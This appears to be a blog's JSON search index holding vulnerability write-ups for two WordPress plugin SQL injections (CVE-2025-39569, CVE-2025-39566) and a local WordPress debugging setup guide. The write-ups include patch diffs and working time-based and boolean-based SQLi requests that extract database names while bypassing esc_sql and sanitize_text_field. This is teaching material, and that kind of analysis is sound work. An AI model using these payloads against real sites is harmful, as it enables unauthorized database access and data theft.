Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vulnerable) and v1.2.3(fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any other tool to compare and see differences between the two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application directly injected user input into an SQL query \u003cstrong\u003ewithout using safeguards\u003c/strong\u003e, leading to an SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-26943 Analysis \u0026 POC"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, 